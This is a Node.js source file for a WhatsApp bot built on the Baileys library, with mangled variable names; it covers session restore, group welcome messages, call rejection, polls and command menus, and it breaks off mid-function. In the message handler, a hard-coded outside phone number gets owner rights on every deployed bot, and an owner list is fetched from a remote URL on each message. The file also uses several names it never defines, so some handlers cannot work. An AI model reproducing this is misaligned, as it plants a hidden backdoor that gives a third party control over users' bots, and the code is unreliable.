const {
  default: makeWASocket,
  getAggregateVotesInPollMessage,
  useMultiFileAuthState,
  DisconnectReason,
  getDevice,
  fetchLatestBaileysVersion,
  jidNormalizedUser,
  getContentType,
  Browsers,
  delay,
  makeInMemoryStore,
  makeCacheableSignalKeyStore,
  downloadContentFromMessage,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  proto
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const P = require("pino");
const FileType = require("file-type");
const moment = require("moment-timezone");
const l = console.log;
var config = require("./settings");
const NodeCache = require('node-cache');
const util = require("util");
var prefix = config.PREFIX;
var prefixRegex = config.PREFIX === "false" || config.PREFIX === "null" ? '^' : new RegExp('^[' + config.PREFIX + ']');
const {
  smsg,
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep,
  fetchJson,
  fetchBuffer,
  getFile
} = require("./lib/functions");
const {
  sms,
  downloadMediaMessage
} = require("./lib/msg");
var {
  updateCMDStore,
  isbtnID,
  getCMDStore,
  getCmdForCmdId,
  connectdb,
  input,
  get,
  updb,
  updfb
} = require('./lib/database');
var {
  get_set,
  input_set
} = require("./lib/set_db");
const axios = require("axios");
const path = require("path");
const msgRetryCounterCache = new NodeCache();
const ownerNumber = config.OWNER_NUMBER;
function decodeBase64(_0x1cb383) {
  return Buffer.from(_0x1cb383, "base64").toString("utf-8");
}
const sessionDir = path.join(__dirname, "session");
if (!fs.existsSync(sessionDir)) {
  fs.mkdirSync(sessionDir);
}
function saveDecodedSessionData(_0x3a0593) {
  const _0x3b42a4 = path.join(sessionDir, "creds.json");
  fs.writeFile(_0x3b42a4, JSON.stringify(_0x3a0593, null, 0x2), _0x47d025 => {
    if (_0x47d025) {
      console.error("Failed to save session data:", _0x47d025.message);
      return;
    }
    console.log("Session data saved successfully.");
  });
}
if (!fs.existsSync(path.join(sessionDir, "creds.json"))) {
  if (config.SESSION_ID) {
    try {
      const decodedSessionId = Buffer.from(config.SESSION_ID.replace("Byte;;;", ''), "base64").toString('utf-8');
      const sessionData = JSON.parse(decodedSessionId);
      saveDecodedSessionData(sessionData);
    } catch (_0xf71472) {
      console.error("Failed to save session ID:", _0xf71472.message);
    }
  } else {
    console.error("No SESSION_ID found!!!!!!!!!!!.");
  }
} else {
  console.log("Session already exists.");
}
const express = require("express");
const app = express();
__path = process.cwd();
const bodyParser = require('body-parser');
const PORT = process.env.PORT || 0x1f40;
async function connectToWA() {
  const {
    version: _0x4276f0,
    isLatest: _0x1c090a
  } = await fetchLatestBaileysVersion();
  console.log("using WA v" + _0x4276f0.join('.') + ", isLatest: " + _0x1c090a);
  const {
    state: _0x331f1f,
    saveCreds: _0x4842ae
  } = await useMultiFileAuthState(__dirname + "/session/");
  const _0x29dc59 = makeWASocket({
    'logger': P({
      'level': "fatal"
    }).child({
      'level': "fatal"
    }),
    'printQRInTerminal': true,
    'generateHighQualityLinkPreview': true,
    'auth': _0x331f1f,
    'defaultQueryTimeoutMs': undefined,
    'msgRetryCounterCache': msgRetryCounterCache
  });
  _0x29dc59.ev.on("connection.update", async _0x2eee0c => {
    const {
      connection: _0x53c492,
      lastDisconnect: _0x2bbb80
    } = _0x2eee0c;
    if (_0x53c492 === "close") {
      if (_0x2bbb80.error.output.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else {
      if (_0x53c492 === "open") {
        console.log("Installing plugins 🔌... ");
        const _0x8d3a2f = require('path');
        fs.readdirSync("./plugins/").forEach(_0x3b8608 => {
          if (_0x8d3a2f.extname(_0x3b8608).toLowerCase() == ".js") {
            require("./plugins/" + _0x3b8608);
          }
        });
        console.log("Bot connected ✅");
        await _0x29dc59.sendMessage(config.OWNER_NUMBER + "@s.whatsapp.net", {
          'text': "*HUNCHO CONNECTED*",
          'contextInfo': {
            'externalAdReply': {
              'title': "Powered by keithkeizzah.",
              'thumbnailUrl': "https://i.imgur.com/4pWgAng.jpeg",
              'sourceUrl': "https://whatsapp.com/channel/0029VaNRcHSJP2199iMQ4W0l",
              'mediaType': 0x1,
              'renderLargerThumbnail': true
            }
          }
        });
      }
    }
  });
  _0x29dc59.ev.on("call", async _0x121b58 => {
    if (config.ANTI_CALL === "true") {
      for (const _0x1192eb of _0x121b58) {
        if (_0x1192eb.status == "offer") {
          if (_0x1192eb.isGroup == false) {
            await _0x29dc59.sendMessage(_0x1192eb.from, {
              'text': "⚠️︱I'm X-BYTE, I rejected Call Because my owner is Busy!",
              'mentions': [_0x1192eb.from]
            });
            await _0x29dc59.rejectCall(_0x1192eb.id, _0x1192eb.from);
          } else {
            await _0x29dc59.rejectCall(_0x1192eb.id, _0x1192eb.from);
          }
        }
      }
    }
  });
  _0x29dc59.ev.on("group-participants.update", async _0x4f1469 => {
    if (config.WELCOME === "true") {
      console.log(_0x4f1469);
      try {
        let _0x1380db = await _0x29dc59.groupMetadata(_0x4f1469.id);
        let _0x5daabc = _0x4f1469.participants;
        for (let _0x47973d of _0x5daabc) {
          try {
            ppuser = await _0x29dc59.profilePictureUrl(_0x47973d, "image");
          } catch (_0x263575) {
            ppuser = "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/XByte-logo.png";
          }
          try {
            ppgroup = await _0x29dc59.profilePictureUrl(_0x4f1469.id, "image");
          } catch (_0x1bac84) {
            ppgroup = "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/XByte-logo.png";
          }
          memb = _0x1380db.participants.length;
          connWlcm = await getBuffer(ppuser);
          connLft = await getBuffer(ppuser);
          if (_0x4f1469.action == "add") {
            const _0x4d18a0 = moment.tz("Asia/Karachi").format("HH:mm:ss");
            const _0x54d49a = moment.tz("Asia/Karachi").format("DD/MM/YYYY");
            const _0x590533 = _0x1380db.participants.length;
            connbody = "┌─❖\n│「 𝗛𝗶 👋 」\n└┬❖ 「  @" + _0x47973d.split('@')[0x0] + "  」\n   │✑  𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 \n   │✑  " + _0x1380db.subject + "\n   │✑  𝗠𝗲𝗺𝗯𝗲𝗿 : \n   │✑ " + _0x590533 + "th\n   │✑  𝗝𝗼𝗶𝗻𝗲𝗱 : \n   │✑ " + _0x4d18a0 + " " + _0x54d49a + "\n   └───────────────┈ ⳹";
            _0x29dc59.sendMessage(_0x4f1469.id, {
              'text': connbody,
              'contextInfo': {
                'mentionedJid': [_0x47973d],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'renderLargerThumbnail': true,
                  'title': "X - B Y T E ",
                  'body': '' + _0x1380db.subject,
                  'containsAutoReply': true,
                  'mediaType': 0x1,
                  'thumbnail': connLft,
                  'sourceUrl': '' + ppuser
                }
              }
            });
          } else {
            if (_0x4f1469.action == "remove") {
              const _0x12600d = moment.tz('Asia/Karachi').format('HH:mm:ss');
              const _0x43a74e = moment.tz("Asia/Karachi").format('DD/MM/YYYY');
              const _0x25e6a1 = _0x1380db.participants.length;
              connbody = "┌─❖\n│「 𝗚𝗼𝗼𝗱𝗯𝘆𝗲 👋 」\n└┬❖ 「 @" + _0x47973d.split('@')[0x0] + "  」\n   │✑  𝗟𝗲𝗳𝘁 \n   │✑ " + _0x1380db.subject + "\n   │✑  𝗠𝗲𝗺𝗯𝗲𝗿 : \n   │✑ " + _0x25e6a1 + "th\n   │✑  𝗧𝗶𝗺𝗲 : \n   │✑  " + _0x12600d + " " + _0x43a74e + "\n   └───────────────┈ ⳹";
              _0x29dc59.sendMessage(_0x4f1469.id, {
                'text': connbody,
                'contextInfo': {
                  'mentionedJid': [_0x47973d],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'renderLargerThumbnail': true,
                    'title': "X - B Y T E ",
                    'body': '' + _0x1380db.subject,
                    'containsAutoReply': true,
                    'mediaType': 0x1,
                    'thumbnail': connLft,
                    'sourceUrl': '' + ppuser
                  }
                }
              });
            }
          }
        }
      } catch (_0x1e7c2c) {
        console.log(_0x1e7c2c);
      }
    }
  });
  _0x29dc59.ev.on("group-participants.update", async _0x44c56d => {
    if (config.ADMIN_EVENT === "true") {
      console.log(_0x44c56d);
      try {
        let _0x1a7ec1 = _0x44c56d.participants;
        for (let _0x43807f of _0x1a7ec1) {
          try {
            ppuser = await _0x29dc59.profilePictureUrl(_0x43807f, "image");
          } catch (_0x934449) {
            ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
          }
          try {
            ppgroup = await _0x29dc59.profilePictureUrl(_0x44c56d.id, 'image');
          } catch (_0x16405e) {
            ppgroup = "https://i.ibb.co/RBx5SQC/avatar-group-large-v2.png?q=60";
          }
          if (_0x44c56d.action == "promote") {
            xeonbody = " 𝗖𝗼𝗻𝗴𝗿𝗮𝘁𝘀🎉 @" + _0x43807f.split('@')[0x0] + ", you have been *promoted* to *admin* 🥳";
            _0x29dc59.sendMessage(_0x44c56d.id, {
              'text': xeonbody,
              'contextInfo': {
                'mentionedJid': [_0x43807f],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'containsAutoReply': true,
                  'title': "X-BYTE",
                  'body': "Powered by TalkDrove",
                  'previewType': "PHOTO",
                  'thumbnailUrl': '',
                  'thumbnail': XeonWlcm,
                  'sourceUrl': '' + wagc
                }
              }
            });
          } else if (_0x44c56d.action == 'demote') {
            xeonbody = "𝗢𝗼𝗽𝘀‼️ @" + _0x43807f.split('@')[0x0] + ", you have been *demoted* from *admin* 😬";
            _0x29dc59.sendMessage(_0x44c56d.id, {
              'text': xeonbody,
              'contextInfo': {
                'mentionedJid': [_0x43807f],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'containsAutoReply': true,
                  'title': "X-BYTE",
                  'body': "Powered by TalkDrove",
                  'previewType': "PHOTO",
                  'thumbnailUrl': '',
                  'thumbnail': XeonLft,
                  'sourceUrl': '' + wagc
                }
              }
            });
          }
        }
      } catch (_0xa5c6e1) {
        console.log(_0xa5c6e1);
      }
    }
  });
  async function _0x5339e9(_0x4e9e45) {
    if (store) {
      const _0x3b9402 = await store.loadMessage(_0x4e9e45.remoteJid, _0x4e9e45.id);
      return _0x3b9402?.["message"];
    }
    return {
      'conversation': "Hai"
    };
  }
  _0x29dc59.ev.on('messages.update', async _0xd176ca => {
    for (const {
      key: _0x4a58a4,
      update: _0x288a82
    } of _0xd176ca) {
      if (_0x288a82.pollUpdates && _0x4a58a4.fromMe) {
        const _0xf9095e = await _0x5339e9(_0x4a58a4);
        if (_0xf9095e) {
          const _0x1d61a5 = await getAggregateVotesInPollMessage({
            'message': _0xf9095e,
            'pollUpdates': _0x288a82.pollUpdates
          });
          var _0x21313a = _0x1d61a5.filter(_0x40b8fa => _0x40b8fa.voters.length !== 0x0)[0x0]?.["name"];
          if (_0x21313a == undefined) {
            return;
          }
          var _0x559641 = prefix + _0x21313a;
          try {
            setTimeout(async () => {
              await gss.sendMessage(_0x4a58a4.remoteJid, {
                'delete': _0x4a58a4
              });
            }, 0x2710);
          } catch (_0x5ad57e) {
            console.error("Error deleting message:", _0x5ad57e);
          }
          gss.appenTextMessage(_0x559641, _0xd176ca);
        }
      }
    }
  });
  _0x29dc59.ev.on("messages.update", async _0x1f9a4e => {
    for (const {
      key: _0x5cd2c9,
      update: _0x126d90
    } of _0x1f9a4e) {
      if (_0x126d90.pollUpdates) {
        const _0x1559fc = await _0x5339e9(_0x5cd2c9);
        const _0x16e99f = _0x1559fc.message;
        if (_0x16e99f) {
          const _0x420465 = _0x5cd2c9.remoteJid;
          const _0x29ff95 = await jidNormalizedUser(_0x29dc59.user.id);
          const _0x4ee84f = await getAggregateVotesInPollMessage({
            'message': _0x16e99f,
            'pollUpdates': _0x126d90.pollUpdates
          });
          let _0x276e20 = _0x4ee84f.find(_0x267534 => _0x267534.voters.length > 0x0)?.['name'] || '';
          let _0x417f9a = _0x4ee84f.findIndex(_0x510503 => _0x510503.name === _0x276e20) || '';
          let _0x51021e = _0x4ee84f.find(_0x163106 => _0x163106.voters.length > 0x0)?.["voters"][0x0] == 'me' ? _0x29ff95 : _0x4ee84f.find(_0x190c93 => _0x190c93.voters.length > 0x0)?.["voters"][0x0];
          function _0x11a81f(_0xb3997c) {
            let _0xa74324 = ["pollCreationMessage", "pollCreationMessageV1", "pollCreationMessageV2", "pollCreationMessageV3"];
            for (let _0x4634d5 of _0xa74324) {
              if (_0xb3997c[_0x4634d5] && _0xb3997c[_0x4634d5].mentionedJid) {
                return _0xb3997c[_0x4634d5].mentionedJid;
              }
            }
            return null;
          }
          function _0x18b13f(_0x26de18) {
            let _0x1a8771 = ["pollCreationMessage", 'pollCreationMessageV1', "pollCreationMessageV2", "pollCreationMessageV3"];
            for (let _0x844b44 of _0x1a8771) {
              if (_0x26de18[_0x844b44] && _0x26de18[_0x844b44].name) {
                return _0x26de18[_0x844b44].name;
              }
            }
            return null;
          }
          const _0x2bb820 = _0x11a81f(_0x16e99f);
          const _0x3f165b = _0x18b13f(_0x16e99f);
          const _0x3b55ae = _0x2bb820?.["includes"](_0x51021e);
          const _0x508a3a = _0x1559fc.key.remoteJid.includes('@g.us') ? _0x1559fc.key.participant : _0x1559fc.key.remoteJid;
          const _0x42be98 = {
            'body': _0x417f9a + 0x1,
            'voted': _0x276e20,
            'from': _0x420465,
            'isRequester': _0x3b55ae ? _0x3b55ae : false,
            'mentionedJid': _0x2bb820,
            'pollSender': _0x508a3a,
            'poll': _0x3f165b,
            'voter': _0x51021e,
            'type': "poll"
          };
          await _0x29dc59.sendMessage(_0x29ff95, {
            'text': JSON.stringify(_0x42be98, null, 0x2)
          });
        }
      }
    }
  });
  _0x29dc59.ev.on('creds.update', _0x4842ae);
  _0x29dc59.ev.on('messages.upsert', async _0x227dc7 => {
    try {
      _0x227dc7 = _0x227dc7.messages[0x0];
      if (!_0x227dc7.message) {
        return;
      }
      var _0xf886ea = require("./lib/id_db");
      _0x227dc7.message = getContentType(_0x227dc7.message) === "ephemeralMessage" ? _0x227dc7.message.ephemeralMessage.message : _0x227dc7.message;
      if (config.AUTO_STATUS_READ === "true") {
        if (_0x227dc7.key && _0x227dc7.key.remoteJid === "status@broadcast") {
          await _0x29dc59.readMessages([_0x227dc7.key]);
        }
      }
      if (_0x227dc7.key && _0x227dc7.key.remoteJid === "status@broadcast") {
        return;
      }
      const _0xaad7b7 = sms(_0x29dc59, _0x227dc7);
      const _0x1b50a0 = getContentType(_0x227dc7.message);
      const _0x416738 = _0x227dc7.key.remoteJid;
      const _0x192c55 = _0x1b50a0 == 'extendedTextMessage' && _0x227dc7.message.extendedTextMessage.contextInfo != null ? _0x227dc7.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
      const _0x2383b2 = _0x1b50a0 === "conversation" ? _0x227dc7.message.conversation : _0x1b50a0 === 'extendedTextMessage' ? _0x227dc7.message.extendedTextMessage.text : _0x1b50a0 == "interactiveResponseMessage" ? _0x227dc7.message.interactiveResponseMessage && _0x227dc7.message.interactiveResponseMessage.nativeFlowResponseMessage && JSON.parse(_0x227dc7.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson) && JSON.parse(_0x227dc7.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x1b50a0 == "templateButtonReplyMessage" ? _0x227dc7.message.templateButtonReplyMessage && _0x227dc7.message.templateButtonReplyMessage.selectedId : _0x1b50a0 === 'extendedTextMessage' ? _0x227dc7.message.extendedTextMessage.text : _0x1b50a0 == "imageMessage" && _0x227dc7.message.imageMessage.caption ? _0x227dc7.message.imageMessage.caption : _0x1b50a0 == 'videoMessage' && _0x227dc7.message.videoMessage.caption ? _0x227dc7.message.videoMessage.caption : '';
      if ((await isbtnID(_0x227dc7.message?.["extendedTextMessage"]?.['contextInfo']?.["stanzaId"])) && getCmdForCmdId(await getCMDStore(_0x227dc7.message?.['extendedTextMessage']?.["contextInfo"]?.["stanzaId"]), _0x227dc7?.['message']?.["extendedTextMessage"]?.["text"])) {
        getCmdForCmdId(await getCMDStore(_0x227dc7.message?.["extendedTextMessage"]?.["contextInfo"]?.["stanzaId"]), _0x227dc7?.["message"]?.["extendedTextMessage"]?.["text"]);
      } else {
        if (_0x1b50a0 === "extendedTextMessage") {
          _0x227dc7.message.extendedTextMessage.text;
        } else {
          if (_0x1b50a0 == 'imageMessage' && _0x227dc7.message.imageMessage.caption) {
            _0x227dc7.message.imageMessage.caption;
          } else if (_0x1b50a0 == "videoMessage" && _0x227dc7.message.videoMessage.caption) {
            _0x227dc7.message.videoMessage.caption;
          } else {
            '';
          }
        }
      }
      _0x29dc59.sendPoll = (_0x31b31a, _0x493813 = '', _0x3a8c7a = [], _0x1bdfea = 0x1) => {
        return _0x29dc59.sendMessage(_0x31b31a, {
          'poll': {
            'name': _0x493813,
            'values': _0x3a8c7a,
            'selectableCount': _0x1bdfea
          }
        });
      };
      var _0x17c6cc = await get_set("all");
      config = await _0x1234ab(config, _0x17c6cc);
      prefix = config.PREFIX;
      var _0x380e88 = _0x2383b2.startsWith(prefix);
      var _0x69c192 = _0x380e88 ? _0x2383b2.slice(prefix.length).trim().split(" ").shift().toLowerCase() : '';
      var _0x2f5b44 = _0x2383b2.trim().split(/ +/).slice(0x1);
      var _0x12d32e = _0x2f5b44.join(" ");
      if (_0xaad7b7.quoted && _0xaad7b7.quoted.fromMe && (await _0xf886ea.check(_0xaad7b7.quoted.id))) {
        if (_0x2383b2.startsWith(prefix)) {
          _0x2383b2 = _0x2383b2.replace(prefix, '');
        }
        var _0x38f9a8 = await _0xf886ea.get_data(_0xaad7b7.quoted.id, _0x2383b2);
        if (_0x38f9a8.cmd) {
          _0x380e88 = true;
          _0x69c192 = _0x38f9a8.cmd.startsWith(prefix) ? _0x38f9a8.cmd.slice(prefix.length).trim().split(" ").shift().toLowerCase() : '';
          _0x2f5b44 = _0x38f9a8.cmd.trim().split(/ +/).slice(0x1);
          _0x12d32e = _0x2f5b44.join(" ");
        }
      }
      console.log(_0x69c192);
      const _0x7aa660 = _0x416738.endsWith("@g.us");
      const _0x4a62b8 = _0x227dc7.key.fromMe ? _0x29dc59.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x29dc59.user.id : _0x227dc7.key.participant || _0x227dc7.key.remoteJid;
      const _0x4d2413 = _0x4a62b8.split('@')[0x0];
      const _0x1bcc74 = _0x29dc59.user.id.split(':')[0x0];
      const _0x4d34b6 = _0x227dc7.pushName || "Sin Nombre";
      const _0x4022c1 = _0x1bcc74.includes(_0x4d2413);
      const _0x40f91d = '923072380380'.includes(_0x4d2413);
      let _0x131e38 = (await axios.get('https://raw.githubusercontent.com/HyHamza/HyHamza/main/files/X-ByteOwners.json')).data;
      const _0x33a59e = _0x131e38.split(',');
      const _0x419bb3 = [..._0x33a59e].map(_0x41eca5 => _0x41eca5.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(_0x4a62b8);
      const _0x38e2e4 = await jidNormalizedUser(_0x29dc59.user.id);
      const _0x5399eb = [_0x38e2e4].map(_0x1e4967 => _0x1e4967.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x4a62b8);
      const _0xc4d47a = _0x4022c1 ? _0x4022c1 : _0x40f91d;
      const _0x1c4d12 = ownerNumber.includes(_0x4d2413) || _0xc4d47a;
      const _0x44c956 = _0x7aa660 ? await _0x29dc59.groupMetadata(_0x416738)["catch"](_0x5aee9f => {}) : '';
      const _0x38fe9a = _0x7aa660 ? _0x44c956.subject : '';
      const _0x25f0cf = _0x7aa660 ? await _0x44c956.participants : '';
      const _0x52070c = _0x7aa660 ? await getGroupAdmins(_0x25f0cf) : '';
      const _0x1c944f = _0x7aa660 ? _0x52070c.includes(_0x38e2e4) : false;
      const _0x29cffd = _0x7aa660 ? _0x52070c.includes(_0x4a62b8) : false;
      const _0x9c0f29 = _0x5eb210 => {
        for (let _0x192446 = 0x0; _0x192446 < _0x5eb210.length; _0x192446++) {
          if (_0x5eb210[_0x192446] === _0x416738) {
            return true;
          }
        }
        return false;
      };
      const _0x428492 = async _0x190043 => {
        return await _0x29dc59.sendMessage(_0x416738, {
          'text': _0x190043
        }, {
          'quoted': _0x227dc7
        });
      };
      function _0x1234ab(_0x175917, _0x4e2a49) {
        for (var _0x1cc147 in _0x4e2a49) {
          _0x175917[_0x1cc147] = _0x4e2a49[_0x1cc147];
        }
        return _0x175917;
      }
      var _0x17c6cc = await get_set("all");
      config = await _0x1234ab(config, _0x17c6cc);
      _0x29dc59.replyad = async _0x2d47ff => {
        return await _0x29dc59.sendMessage(_0x416738, {
          'text': _0x2d47ff,
          'contextInfo': {
            'mentionedJid': [''],
            'groupMentions': [],
            'forwardingScore': 0x1,
            'isForwarded': true,
            'forwardedNewsletterMessageInfo': {
              'newsletterJid': "120363252060326102@newsletter",
              'serverMessageId': 0x7f
            },
            'externalAdReply': {
              'title': "X-BYTE, POWERED BY TALKDROVE ",
              'body': "Created by Hamza",
              'mediaType': 0x1,
              'sourceUrl': "https://wa.me/923072380380",
              'thumbnailUrl': "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/XByte-logo.png",
              'renderLargerThumbnail': false,
              'showAdAttribution': true
            }
          }
        }, {
          'quoted': _0x227dc7
        });
      };
      _0x29dc59.buttonMessage2 = async (_0x1bf6a8, _0x113b18, _0xf2d175) => {
        let _0x516488 = '';
        const _0x48bca3 = [];
        _0x113b18.buttons.forEach((_0x56915c, _0x943a01) => {
          const _0x3ff8d6 = '' + (_0x943a01 + 0x1);
          _0x516488 += "\n" + _0x3ff8d6 + " | " + _0x56915c.buttonText.displayText + "\n";
          _0x48bca3.push({
            'cmdId': _0x3ff8d6,
            'cmd': _0x56915c.buttonId
          });
        });
        if (_0x113b18.headerType === 0x1) {
          const _0x3389b0 = _0x113b18.text + "\n\n🔢 Reply you want number," + _0x516488 + "\n" + _0x113b18.footer;
          const _0x4bf7f5 = await _0x29dc59.sendMessage(_0x416738, {
            'text': _0x3389b0,
            'contextInfo': {
              'mentionedJid': [''],
              'groupMentions': [],
              'forwardingScore': 0x1,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': '120363252060326102@newsletter',
                'serverMessageId': 0x7f
              },
              'externalAdReply': {
                'title': "X-BYTE, POWERED BY TALKDROVE ",
                'body': "Created by Hamza",
                'mediaType': 0x1,
                'sourceUrl': 'https://wa.me/923072380380',
                'thumbnailUrl': "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/XByte-logo.png",
                'renderLargerThumbnail': false,
                'showAdAttribution': true
              }
            }
          }, {
            'quoted': _0xf2d175 || _0x227dc7
          });
          await updateCMDStore(_0x4bf7f5.key.id, _0x48bca3);
        } else {
          if (_0x113b18.headerType === 0x4) {
            const _0x1b435e = _0x113b18.caption + "\n\n🔢 Reply you want number," + _0x516488 + "\n" + _0x113b18.footer;
            const _0x19c021 = await _0x29dc59.sendMessage(_0x1bf6a8, {
              'image': _0x113b18.image,
              'caption': _0x1b435e,
              'contextInfo': {
                'mentionedJid': [''],
                'groupMentions': [],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': "120363252060326102@newsletter",
                  'serverMessageId': 0x7f
                },
                'externalAdReply': {
                  'title': "X-BYTE, POWERED BY TALKDROVE ",
                  'body': "Created by Hamza",
                  'mediaType': 0x1,
                  'sourceUrl': 'https://wa.me/923072380380',
                  'thumbnailUrl': 'https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/XByte-logo.png',
                  'renderLargerThumbnail': false,
                  'showAdAttribution': true
                }
              }
            }, {
              'quoted': _0xf2d175 || _0x227dc7
            });
            await updateCMDStore(_0x19c021.key.id, _0x48bca3);
          }
        }
      };
      _0x29dc59.replyList = async (_0x512d2f, _0x2aed75, _0x193f9) => {
        function _0x59e69a(_0x31f47c) {
          let _0x37bdb3 = '';
          _0x31f47c.forEach((_0x18f8aa, _0x533bb5) => {
            _0x37bdb3 += _0x18f8aa.title ? _0x18f8aa.title + "\n" : '';
            _0x18f8aa.rows.forEach((_0x4e8c2b, _0x42e121) => {
              _0x37bdb3 += _0x4e8c2b.title + " || " + _0x4e8c2b.description;
              _0x37bdb3 += _0x42e121 === _0x18f8aa.rows.length - 0x1 ? '' : "\n";
            });
            _0x37bdb3 += _0x533bb5 === _0x31f47c.length - 0x1 ? '' : "\n\n";
          });
          return _0x37bdb3;
        }
        if (!_0x2aed75.sections) {
          return false;
        }
        _0x2aed75[_0x2aed75.caption ? "caption" : 'text'] = (_0x2aed75.title ? _0x2aed75.title + "\n\n" : '') + (_0x2aed75.caption ? _0x2aed75.caption : _0x2aed75.text) + "\n\n" + _0x2aed75.buttonText + "\n\n" + (await _0x59e69a(_0x2aed75.sections)) + "\n\n" + _0x2aed75.footer;
        var _0x5035ec = {
          ..._0x2aed75
        };
        delete _0x2aed75.sections;
        delete _0x2aed75.footer;
        delete _0x2aed75.buttonText;
        delete _0x2aed75.title;
        const _0x3f302a = await _0x29dc59.sendMessage(_0x512d2f, _0x2aed75, _0x193f9);
        const _0x3a4f87 = [];
        _0x5035ec.sections.forEach(_0x370911 => {
          _0x370911.rows.forEach(_0x4a360d => {
            _0x3a4f87.push({
              'rowId': _0x4a360d.rowId,
              'title': _0x4a360d.title
            });
          });
        });
        for (let _0x2c40d9 = 0x0; _0x2c40d9 < _0x3a4f87.length; _0x2c40d9++) {
          await _0xf886ea.input_data(_0x3a4f87[_0x2c40d9].rowId, _0x3a4f87[_0x2c40d9].title, _0x3f302a.key.id);
        }
      };
      _0x29dc59.buttonMessage = async (_0x153a0b, _0x542ee5, _0x116055) => {
        let _0xc77a3 = '';
        const _0x3be7e9 = [];
        _0x542ee5.buttons.forEach((_0x5585f2, _0x46d2de) => {
          const _0x112660 = '' + (_0x46d2de + 0x1);
          _0xc77a3 += "\n" + _0x112660 + " | " + _0x5585f2.buttonText.displayText + "\n";
          _0x3be7e9.push({
            'cmdId': _0x112660,
            'cmd': _0x5585f2.buttonId
          });
        });
        if (_0x542ee5.headerType === 0x1) {
          const _0x175df7 = (_0x542ee5.text || _0x542ee5.caption) + "\n🔢 Reply you want number," + _0xc77a3 + "\n\n" + _0x542ee5.footer;
          const _0x46e2da = await _0x29dc59.sendMessage(_0x416738, {
            'text': _0x175df7,
            'contextInfo': {
              'mentionedJid': [''],
              'groupMentions': [],
              'forwardingScore': 0x1,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363252060326102@newsletter",
                'serverMessageId': 0x7f
              },
              'externalAdReply': {
                'title': "X-BYTE, POWERED BY TALKDROVE ",
                'body': "Created by Hamza",
                'mediaType': 0x1,
                'sourceUrl': "https://wa.me/923072380380",
                'thumbnailUrl': 'https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/XByte-logo.png',
                'renderLargerThumbnail': false,
                'showAdAttribution': true
              }
            }
          }, {
            'quoted': _0x116055 || _0x227dc7
          });
          await updateCMDStore(_0x46e2da.key.id, _0x3be7e9);
        } else {
          if (_0x542ee5.headerType === 0x4) {
            const _0x268e17 = _0x542ee5.caption + "\n\n🔢 Reply you want number," + _0xc77a3 + "\n" + _0x542ee5.footer;
            const _0x4fed06 = await _0x29dc59.sendMessage(_0x153a0b, {
              'image': _0x542ee5.image,
              'caption': _0x268e17,
              'contextInfo': {
                'mentionedJid': [''],
                'groupMentions': [],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': "120363252060326102@newsletter",
                  'serverMessageId': 0x7f
                },
                'externalAdReply': {
                  'title': "X-BYTE, POWERED BY TALKDROVE ",
                  'body': "Created by Hamza",
                  'mediaType': 0x1,
                  'sourceUrl': "https://wa.me/923072380380",
                  'thumbnailUrl': "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/XByte-logo.png",
                  'renderLargerThumbnail': false,
                  'showAdAttribution': true
                }
              }
            }, {
              'quoted': _0x116055 || _0x227dc7
            });
            await updateCMDStore(_0x4fed06.key.id, _0x3be7e9);
          }
        }
      };
      _0x29dc59.listMessage2 = async (_0xcbd7c, _0x2d357b, _0x10932a) => {
        let _0x5c984d = '';
        const _0x9cdcea = [];
        _0x2d357b.sections.forEach((_0xadddb0, _0x5e6077) => {
          const _0x4dda75 = '' + (_0x5e6077 + 0x1);
          _0x5c984d += "\n[" + _0x4dda75 + "] " + _0xadddb0.title + "\n";
          _0xadddb0.rows.forEach((_0x44f46f, _0x19bd8c) => {
            const _0x5b4bf4 = _0x4dda75 + '.' + (_0x19bd8c + 0x1);
            const _0x22c5e9 = "   " + _0x5b4bf4 + " | " + _0x44f46f.title;
            _0x5c984d += _0x22c5e9 + "\n";
            if (_0x44f46f.description) {
              _0x5c984d += "   " + _0x44f46f.description + "\n\n";
            }
            _0x9cdcea.push({
              'cmdId': _0x5b4bf4,
              'cmd': _0x44f46f.rowId
            });
          });
        });
        const _0x16de14 = _0x2d357b.text + "\n\n" + _0x2d357b.buttonText + ',' + _0x5c984d + "\n" + _0x2d357b.footer;
        const _0x3ea424 = await _0x29dc59.sendMessage(_0x416738, {
          'text': _0x16de14,
          'contextInfo': {
            'mentionedJid': [''],
            'groupMentions': [],
            'forwardingScore': 0x1,
            'isForwarded': true,
            'forwardedNewsletterMessageInfo': {
              'newsletterJid': "120363252060326102@newsletter",
              'serverMessageId': 0x7f
            },
            'externalAdReply': {
              'title': "X-BYTE, POWERED BY TALKDROVE ",
              'body': "Created by Hamza",
              'mediaType': 0x1,
              'sourceUrl': "https://wa.me/923072380380",
              'thumbnailUrl': "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/XByte-logo.png",
              'renderLargerThumbnail': false,
              'showAdAttribution': true
            }
          }
        }, {
          'quoted': _0x10932a || _0x227dc7
        });
